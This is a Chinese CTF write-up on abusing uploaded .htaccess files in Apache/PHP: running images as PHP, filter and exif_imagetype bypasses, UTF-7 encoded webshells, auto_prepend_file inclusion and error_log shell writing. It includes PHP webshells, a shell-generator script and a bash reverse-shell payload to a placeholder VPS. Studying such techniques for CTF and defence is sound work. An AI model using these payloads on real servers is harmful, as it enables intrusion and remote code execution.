\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/XaZ-oe9dcPPBu3DQvZzwUg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/Go7NSXrKWd6Jd36S86K7pfK7YG3YwoibbaKibdiaA4ScV5pLj54YaLH8arM8JXtSxcueCTCaoxdzQRt0XHp0Qicnyw/640?wx_fmt=jpeg)

.htaccess 文件是 Apache 服务器中的一个配置文件，它负责相关目录下的网页配置。通过. htaccess 文件，可以改变所在文件夹和子文件下的 php.ini 配置。

在 CTF 赛题中，如果能够上传或者写入一个. htaccess，就可以做到绕过 WAF、文件包含等操作，笔者之前参加比赛时看到过. htaccess 文件的利用，于是将各种用法总结出来分享给大家，希望有所帮助。

![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWiaYyUy2LD2xphKdkhBEVEIiblSV80heLvPMmrLhUV9tQUKggdHAicuqN6GMhPARn7wJBaDhERGf8icbw/640?wx_fmt=gif)

本文是 i 春秋论坛作家「kawhi」表哥原创的技术文章分享，公众号旨在为大家提供更多的学习方法与技能技巧，文章仅供学习参考。  

![](https://mmbiz.qpic.cn/mmbiz_gif/UXia70eNibyzhRruic0mSo5nq6QewrXQU9emNtAx5ooDDL9icHsiazyicx8cwBhMQziaDT8Z5xOk7p9zGItQicbPIAue0g/640?wx_fmt=gif)

.htaccess 文件是默认开启的，如果没有启动. htaccess 文件的话，需要修改配置文件 httpd.conf 中的以下两点：  

*   把 AllowOverride None 修改为：AllowOverride All；
    
*   把 LoadModule rewrite\_module modules/mod\_rewrite.so 这句话前面的 #去掉。
    

**.htaccess 任意文件解析**

在 CTF 中. htaccess 文件最常用的地方就是文件上传题目，如果题目中使用的是黑名单机制，即限制上传 php，pthml，pht 等后缀，我们可以使用. htaccess 文件重新配置当前文件的解析后缀，为其他后缀绕过导致其他后缀的文件被解析为 php，就可以导致远程代码执行。

**AddType**

比如在 upload-labs 的第四关就可以使用这种方法绕过，首先是限制了 php 的后缀，如图所示 shell.php 不允许上传。

![](https://mmbiz.qpic.cn/mmbiz_png/Go7NSXrKWd6Jd36S86K7pfK7YG3YwoibbiaticoAU01LvAsYYFiauiantMaWVdGlT0xTq01ria65sYzXicaWNk92Jt3GQ/640?wx_fmt=png)

但是题目并没有限制. htaccess 文件的上传，可以上传一个. htaccess 文件内容如下：

```
AddType application/x-httpd-php .jpg
```

AddType 可以指示文件管理系统，对指定后缀文件以选定的文件类型解析，整句话的作用就是让 jpg 格式的文件解析为 php 文件。  

上传完. htaccess 文件之后再上传一个写入一句话木马的 shell.jpg 文件，尝试连接蚁剑。

![](https://mmbiz.qpic.cn/mmbiz_png/Go7NSXrKWd6Jd36S86K7pfK7YG3YwoibbbygelQ7blMpicDmk8YR17Ye3gbUaicLEE92qZN9LternibgtAicp2iagbdw/640?wx_fmt=png)

发现已经成功连接上了，说明我们上传的. htaccess 文件已经成功让 jpg 格式的文件解析为 php 了。

**AddHandler**

除了 AddType 之外还有 AddHandler，我们想将 txt 文件后缀解析为 php 运行，可以在. htaccess 中写下以下两行的其中一行。

*   AddHandler php5-script .txt
    
*   AddHandler php7-script .txt
    

意思是指定扩展名为. php 的文件应被 php5-srcipt/php7-srcipt 处理器来处理。

![](https://mmbiz.qpic.cn/mmbiz_png/Go7NSXrKWd6Jd36S86K7pfK7YG3YwoibbBRibiafsYsx4SKAviaEpjHlHQ6EEkt9LBN2aCDkiaZ7KNppG9HSOXxLpfg/640?wx_fmt=png)

可以看到写入前后的对比，后者成功把 txt 文件解析为 php 文件。

一般这种可以配合着其他的语句来使用，比如说 \[de1ctf 2020\]Check in 的这道题，过滤了如下黑名单：

```
perl|pyth|ph|auto|curl|base|>|rm|ruby|openssl|war|lua|msf|xter|telnet
```

我们可以上传一个. htaccess 内容如下，主要让 txt 文件解析为 php 文件，再把 flag 包含进来。

```
AddHandler p\\hp5-script .txtp\\hp\_value au\\to\_append\_file /flag
```

再上传一个 1.txt 就能加载 / flag 内容。不过这里涉及到了. htaccess 的换行绕过和文件包含，下面都会提到。

**SetHandler**

.htaccess 文件解析还有另外一种常见写法就是利用 SetHandler，文件内容如下：

```
SetHandler application/x-httpd-php
```

这样所有文件都会当成 php 来解析，如果要指定某一个类型文件的话，可以写：

```
<FilesMatch "shell.jpg">    SetHandler application/x-httpd-php</FilesMatch>
```

将 shell.jpg 解析为 php 文件，同时这里可以使用正则匹配文件比如：

```
<FilesMatch "\\.ph.\*$">  SetHandler application/x-httpd-php</FilesMatch>
```

就是匹配所有的. ph 开头的后缀文件。

SetHandler 还有一种用法就是在. htaccess 写入：

```
SetHandler server-status
```

然后再访问 http://ip/server-status 即可查看所有访问本站的记录，\[de1ctf 2020\]Check in 这道题的官方 wp 中提到了这种方式去获取信息。  

**.htaccess 的一些绕过**

**绕过关键字**

像上面的 upload-labs 的第四关内容中如果过滤了 application 关键字，因为. htaccess 支持换行编写，我们可以使用反斜杠换行绕过的方法，如：

```
AddType appli\\cation/x-httpd-php .jpg
```

**绕过 exif\_imagetype 函数**

exif\_imagetype( ) 的作用是读取一个图像的第一个字节并检查其签名。

比如 \[SUCTF 2019\]EasyWeb 这道题就有这个函数，关键代码如下：

```
$tmp\_name = $\_FILES\["file"\]\["tmp\_name"\];if(!exif\_imagetype($tmp\_name)) die("^\_^");
```

要注意的是通常我们会在上传文件中加上 gif 的文件头 GIF89a 去绕过，但是. htaccess 文件用这种方法虽然能上传成功，但是无法生效。我们可以在. htaccess 文件前面加上：

```
#define 4c11f3876d494218ff327e3ca6ac824f\_width xxx(大小)#define 4c11f3876d494218ff327e3ca6ac824f\_height xxx(大小)
```

这里的原理其实是伪造为 xbm 文件，xbm 文件是一种图片格式的文件。

![](https://mmbiz.qpic.cn/mmbiz_png/Go7NSXrKWd6Jd36S86K7pfK7YG3YwoibbUznQOwdZOrXekKJSOaVF816jbf6E9IonDn6icSibwyia4iaRv1ntkhkibVw/640?wx_fmt=png)

在 php 的官方文档中，exif\_imagetype( ) 是可以支持 xbm 类型的文件的。

**绕过拼接字符**

比如近期的一道题目，其中部分代码如下：

```
file\_put\_contents($filename, $content . "\\nHello, world");
```

这一题的思路是利用. htaccess 文件把恶意代码包含进 index.php 里面，但是在变量 $content 后面拼接了一个 "\\nHello, world"，这样的话会不符合. htaccess 文件的语法，导致服务器报一个 500 错误，这时候我们可以使用反斜杠先把 \\ n 转义，再在加入的恶意代码前面加上一个 #注释掉后面的内容，这样的话就可以绕过 "\\nHello, world"，从而使得. htaccess 符合语法。

最终 payload 结果如下：

```
php\_value auto\_prepend\_fil\\e .htaccess#<?php system('cat /fla'.'g');?>\\&filename=.htaccess
```

这里要注意的是在传参的时候都是要 url 编码的。

**.htaccess 的常见用法**

首先了解一下 php\_value 和 php\_flag：  

*   php\_value：设定指定的值，但不能设定布尔值；
    
*   php\_flag：用来设定布尔值的配置指令。
    

这两个可以用来设置指令的值，使得在 Apache 配置文件内部修改 PHP 的配置，那么这些指令有哪些呢，比如说 auto\_prepend\_file，display\_errors 等等，具体的话参考官方给出的：php.ini 配置选项列表

当然上面说的这两个都是可以用于. htaccess 中的，同样功能的还有 php\_admin\_value 和 php\_admin\_flag，但是这两个无法用于. htaccess 中。

下面介绍两个最常见的用法：

**特殊编码绕过**

如果对文件内容进行过滤了 <?，同时版本 php7 已经抛弃了 < script language='php'> 和<%，使得我们无法利用 php 其他风格的标签去绕过。这里可以考虑在. htaccess 中设置 UTF-7 字符或者其他字符进行绕过。

我们可以先上传一个 shell.jpg 内容如下：

```
#define 4c11f3876d494218ff327e3ca6ac824f\_width 1337#define 4c11f3876d494218ff327e3ca6ac824f\_height 1337+ADw?php +AEA-eval(+ACQAXw-POST+AFs'cmd'+AF0)+ADs?+AD4-
```

第三句是经过 UTF-7 编码的，在线 UTF-7 编码：UTF-7 Encoder。

我们接下来要做的就是利用. htaccess 文件把他进行 UTF-7 解码。

我们再写入一个. htaccess 文件内容如下：

```
#define 4c11f3876d494218ff327e3ca6ac824f\_width 1337#define 4c11f3876d494218ff327e3ca6ac824f\_height 1337AddType application/x-httpd-php .jpgphp\_flag display\_errors onphp\_flag zend.multibyte 1php\_value zend.script\_encoding "UTF-7"
```

前 3 行在上面已经讲过，这里不再赘述。

第 4 行中的 php\_flag，后面跟着 display\_errors on，本句的作用是关闭错误提示，也就是差不多相当于 error\_reporting(0)；

第 5 行中的 php\_flag，把 zend.multibyte 的值设置为 1，原因是在使用 UTF-7、SJIS、BIG5 等在多字节字符串数据中包含特殊字符的字符编码是要启用 zend.multibyte 的，如果是 UTF-8 编码的话则不需要这个选项。

最后一句是关键点了，php\_value 中设置了 zend.script\_encoding "UTF-7"，本句的作用是对上传的文件进行一个 UTF-7 的解码。

这里我直接在本地 phpstudy 直接写入. htaccess 和 shell.jpg，测试了一下是可行的：

![](https://mmbiz.qpic.cn/mmbiz_png/Go7NSXrKWd6Jd36S86K7pfK7YG3Ywoibbz6kWuNDOQJVa5XYicxXiaJDtQrdwGhN850wqwj6DjQOL0qTLYhShq9Fg/640?wx_fmt=png)

要注意的是，在本地 phpstudy 写入. htaccess 文件的话，php 的版本要选择不带 nts 的。

在 \[SUCTF 2019\]EasyWeb 这道题里面就可以用到这个方法，但不局限于这种，在看其他师傅的 writeup 中，发现本题也可以通过设置 utf-16be 来进行绕过，这里借用一下网上的一键生成. htaccess 脚本。

```
SIZE\_HEADER = b"\\n\\n#define width 1337\\n#define height 1337\\n\\n"def generate\_php\_file(filename, script):    phpfile = open(filename, 'wb')    phpfile.write(script.encode('utf-16be'))    phpfile.write(SIZE\_HEADER)    phpfile.close()def generate\_htacess():    htaccess = open('.htaccess', 'wb')    htaccess.write(SIZE\_HEADER)    htaccess.write(b'AddType application/x-httpd-php .lethe\\n')    htaccess.write(b'php\_value zend.multibyte 1\\n')    htaccess.write(b'php\_value zend.detect\_unicode 1\\n')    htaccess.write(b'php\_value display\_errors 1\\n')    htaccess.close()generate\_htacess()generate\_php\_file("shell.lethe", "<?php eval($\_GET\['cmd'\]); die(); ?>")
```

### **进行文件包含**

在刚刚提到的 php\_value 的指令中，也就是 php.ini 中有两项：

在所有页面的顶部与底部 require 文件

*   auto\_prepend\_file 在页面顶部加载文件
    
*   auto\_append\_file 在页面底部加载文件
    

我们可以利用这个将 1.php 文件包含进所有的 php 页面

```
php\_value auto\_prepend\_file 1.php
```

![](https://mmbiz.qpic.cn/mmbiz_png/Go7NSXrKWd6Jd36S86K7pfK7YG3YwoibbC6a7hy7G7mgiaF6ORQ1IZjUaV2rvQibAcPXMibQIvSPD5D5XnsV4ynVZA/640?wx_fmt=png)

可以看到 1.php 成功包含进去 shell.php 里面了。  

这里我们甚至可以利用伪协议配合做一个编码，.htaccess 如下：

```
AddType application/x-httpd-php .jpgphp\_value auto\_append\_file "php://filter/convert.base64-decode/resource=shell.jpg"
```

把 shell.jpg 进行 base64 解码后再包含进所有的 php 页面。

![](https://mmbiz.qpic.cn/mmbiz_png/Go7NSXrKWd6Jd36S86K7pfK7YG3YwoibbgO3aiabt4hjyenKycFEvRzNuUKx1Z876LHPhiaUBEaGOEsib7MtFB2y6A/640?wx_fmt=png)

如图可以看到在 1.php 页面已经可以看到 shell.jpg 的 phpinfo 了。  

以这道题目为例子，原题是 X-NUCA'2019—Ezphp。

题目的源码为：

```
<?php    $files = scandir('./');    foreach($files as $file) {        if(is\_file($file)){            if ($file !== "index.php") {                unlink($file);            }        }    }    if(!isset($\_GET\['content'\]) || !isset($\_GET\['filename'\])) {        highlight\_file(\_\_FILE\_\_);        die();    }    $content = $\_GET\['content'\];    if(stristr($content,'on') || stristr($content,'html') || stristr($content,'type') || stristr($content,'flag') || stristr($content,'upload') || stristr($content,'file')) {        echo "Hacker";        die();    }    $filename = $\_GET\['filename'\];    if(preg\_match("/\[^a-z\\.\]/", $filename) == 1) {        echo "Hacker";        die();    }    $files = scandir('./');    foreach($files as $file) {        if(is\_file($file)){            if ($file !== "index.php") {                unlink($file);            }        }    }    file\_put\_contents($filename, $content . "\\nHello, world");?>
```

这里前后有两个 unlink 函数，会清除该目录下除了 index.php 文件以外的所有文件。然后看到 file\_put\_contents 函数。然后对 filename 只允许存在 a-z 和.，也就是说明无法用伪协议去做了，然后 content 过滤了一些关键字。

这里就可以把. htaccess 文件包含进 index.php 文件里面，因为这里 unlink 没法删除. htaccess，然后在. htaccess 中插入恶意代码。首先包含的是：

```
php\_value auto\_prepend\_file .htaccess
```

这里看到 stristr 函数把 file 关键字过滤了，我们上面已经讲了如果去绕过了，即：

```
php\_value auto\_prepend\_fil\\ e .htaccess
```

然后后面拼接的 \\ nHello, world 绕过拼接字符这个点上面也讲过了，这里不再赘述，构造 payload 如下：

```
php\_value auto\_prepend\_fil\\ e .htaccess #<?php phpinfo();?>\\
```

把 phpinfo(); 换成如下即可反弹一个 shell。

```
system(\\'bash -c "/bin/bash -i >%26 /dev/tcp/your-vps-ip/2333 0<%261"\\');
```

一键写入文件并反弹脚本如下：

```
import requestsurl = 'http://a1ad9f70-8d0c-432f-b973-6494e65e2be6.node3.buuoj.cn/'payload = '?filename=.htaccess&content=php\_value%20auto\_prepend\_fi\\\\%0Ale%20".htaccess"\\n%23<?php system(\\'bash -c "/bin/bash -i >%26 /dev/tcp/your-vps-ip/2333 0<%261"\\');?>\\\\'url2 = url + payloadr = requests.get(url2)req = request.get(url)
```

![](https://mmbiz.qpic.cn/mmbiz_png/Go7NSXrKWd6Jd36S86K7pfK7YG3YwoibbdxKdPWZYcIzWrMlDHhej5817u17c4CM99kGbxzWYibE7AbMUIFDjpcQ/640?wx_fmt=png)

**.htaccess 其他利用点**

**prce 回溯绕过正则匹配**

我们先看如下一段代码：

```
<?php$filename = 'php://filter';if(preg\_match("/\[^a-z\\.\]/", $filename) == 1) {    echo "Hacker";    var\_dump(preg\_match("/\[^a-z\\.\]/", $filename));}else{    echo "hello";    var\_dump(preg\_match("/\[^a-z\\.\]/", $filename));}//Hackerint(1)
```

这里的正则只匹配 a-z 以及. 组成的的变量，而我给变量赋值了 php://filter，很明显输出了 Hacker。但是当我们写入. htaccess 就会发生一些有趣的事情了。

.htaccess 文件内容如下：

```
php\_value pcre.backtrack\_limit 0php\_value pcre.jit 0
```

这里是通过 php\_value 设置正则回朔次数，然后再看返回的结果：

![](https://mmbiz.qpic.cn/mmbiz_png/Go7NSXrKWd6Jd36S86K7pfK7YG3Ywoibbm6eibfezNK3W7JAZibAicAaDCMOicdzgILias9Dl6sVmOsOYNibO4ibx0rWwA/640?wx_fmt=png)

发现 preg\_match 返回了布尔值 False，这样就可以达到绕过这个正则。

在前面说的 X-NUCA'2019—Ezphp 这个题目中，就是因为正则的限制导致我们不能够写 php://filter 伪协议，然后我们通过这种回溯绕过的方法，就可以用这种绕过这个正则，利用伪协议去写一个 shell 了。

用伪协议写 shell 的 payload 如下：

```
?filename=php://filter/write=convert.base64decode/resource=.htaccess&content=cGhwX3ZhbHVlIHBjcmUuYmFja3RyYWNrX2xpbWl0IDAKcG hwX3ZhbHVlIHBjcmUuaml0IDAKcGhwX3ZhbHVlIGF1dG9fYXBwZW5kX2ZpbGUgLmh0YWNjZXNzCiM8P3 BocCBldmFsKCRfR0VUWzFdKTs/Plw&1=phpinfo();
```

**error\_log 生成 shell**

个人感觉这种思路有点像 mysql 日志写 shell，首先是通过 php 的配置选项中的 error\_log 可以将 php 运行报错的记录写到指定文件中，然后如果有 include\_once 这种包含的函数去包含一个不存在的文件，就会导致报错导致在你指定的目录下生成文件。然后在 include\_path 中写入恶意的代码，这个代码就会出现在刚刚生成的文件当中。

但是千万要注意的一点是：写进 error\_log 的内容会被 html 编码。

我们可以采用上面刚刚讲过的 utf7 编码即可绕过。

比如在 index.php 写入如下代码：

```
<?phpinclude\_once("fl3g.php");$content = $\_GET\['content'\];$filename = $\_GET\['filename'\];file\_put\_contents($filename, $content . "\\nJust one chance");?>
```

然后写入. htaccess 文件，内容如下：

```
php\_value error\_log D:\\phpStudy\\PHPTutorial\\WWW\\tmp\\fl3g.phpphp\_value error\_reporting 32767php\_value include\_path "+ADw?php eval($\_GET\[cmd\])+ADs +AF8AXw-halt+AF8-compiler()+ADs"# \\
```

这里第二行 error\_reporting 32767 的意思是设置报告级别为 32767，使得报告出所有可能出现的错误，确保我们可以写入木马。

我们将其 url 编码传参写入，然后会报错一些错。

![](https://mmbiz.qpic.cn/mmbiz_png/Go7NSXrKWd6Jd36S86K7pfK7YG3YwoibbHgtrqMqNGpFnluBF0A6QrVaY26Hy7CQtmMCYzjrXQY58ibXEIFRoXFQ/640?wx_fmt=png)

我们再回头看看我们文件里面生成了什么？  

![](https://mmbiz.qpic.cn/mmbiz_png/Go7NSXrKWd6Jd36S86K7pfK7YG3Ywoibby36077jcTibSDKw4icyZGVG4qjYWOwMbDNgbCeyoVApc2QvXiazNthicQg/640?wx_fmt=png)

可以发现在 tmp 目录已经成功生成了 fl3g.php 文件，并写入了我们之前在 include\_path 设置的内容。但是还有一个问题就是要将里面的内容进行 UTF-7 解码，这里就很简单了，直接再上传一个. htaccess 内容如下：  

```
php\_value include\_path "D:\\phpStudy\\PHPTutorial\\WWW\\tmp"php\_value zend.multibyte 1php\_value zend.script\_encoding "UTF-7"# \\
```

并给 cmd 传参 phpinfo( );，成功利用。

一如既往的学习，一如既往的整理，一如即往的分享。感谢支持![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icl7QVywL8iaGT0QBGpOwgD1IwN0z9JicTRvzvnsJicNRr2gRvJib6jKojzC5CJJsFPkEbZQJ999HrH5Gw/640?wx_fmt=png)

**【好书推荐】**

![](https://mmbiz.qpic.cn/mmbiz_png/ffq88LJJ8oPhzuqa2g06cq4ibd8KROg1zLzfrh8U6DZtO1oWkTC1hOvSicE26GgK8WLTjgngE0ViaIFGXj2bE32NA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_gif/x1FY7hp5L8Hr4hmCxbekk2xgNEJRr8vlbLKbZjjWdV4eMia5VpwsZHOfZmCGgia9oCO9zWYSzfTSIN95oRGMdgAw/640?wx_fmt=gif)

[2020hw 系列文章整理（中秋快乐、国庆快乐、双节快乐）](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247492405&idx=1&sn=c84692daf6077f5cc7c348d1e5b3a349&chksm=f9e38c6ece9405785260b092d04cfb56fec279178d4efcd34bf8121b89a28885bf20568cdfda&scene=21#wechat_redirect)  

[HW 中如何检测和阻止 DNS 隧道](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247492405&idx=2&sn=7afccd524c176b4912526d8f5d58dc3a&chksm=f9e38c6ece940578b5a4f0f102fa5a20b6facee51f23e3fa25598e9e7257c798180edcdf5802&scene=21#wechat_redirect)

[ctf 系列文章整理](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247493664&idx=1&sn=40df204276e9d77f5447a0e2502aebe3&chksm=f9e3877bce940e6d0e26688a59672706f324dedf0834fb43c76cffca063f5131f87716987260&scene=21#wechat_redirect)

[日志安全系列 - 安全日志](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247494122&idx=1&sn=984043006a1f65484f274eed11d8968e&chksm=f9e386b1ce940fa79b578c32ebf02e69558bcb932d4dc39c81f4cf6399617a95fc1ccf52263c&scene=21#wechat_redirect)

[【干货】流量分析系列文章整理](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247494242&idx=1&sn=7f102d4db8cb4dddb5672713803dc000&chksm=f9e38539ce940c2f488637f312fb56fd2d13a3dd57a3a938cd6d6a68ebaf8806b37acd1ce5d0&scene=21#wechat_redirect)

[【干货】超全的 渗透测试系列文章整理](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247494408&idx=1&sn=75b61410ecc5103edc0b0b887fd131a4&chksm=f9e38453ce940d450dc10b69c86442c01a4cd0210ba49f14468b3d4bcb9d634777854374457c&scene=21#wechat_redirect)

[【干货】持续性更新 - 内网渗透测试系列文章](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247494623&idx=1&sn=f52145509aa1a6d941c5d9c42d88328c&chksm=f9e38484ce940d920d8a6b24d543da7dd405d75291b574bf34ca43091827262804bbef564603&scene=21#wechat_redirect)  

[【干货】android 安全系列文章整理](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247494707&idx=1&sn=5b2596d41bda019fcb15bbfcce517621&chksm=f9e38368ce940a7e95946b0221d40d3c62eeae515437c040afd144ed9d499dcf9cc67f2874fe&scene=21#wechat_redirect)

****扫描关注 LemonSec****  

![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icncXiavFRorU03O5AoZQYznLCnFJLs8RQbC9sltHYyicOu9uchegP88kUFsS8KjITnrQMfYp9g2vQfw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icnAsbXzXAVx0TwTHEy4yhBTShsTzrKfPqByzM33IVib0gdPRn3rJw3oz2uXBa4h2msAcJV6mztxvjQ/640?wx_fmt=png)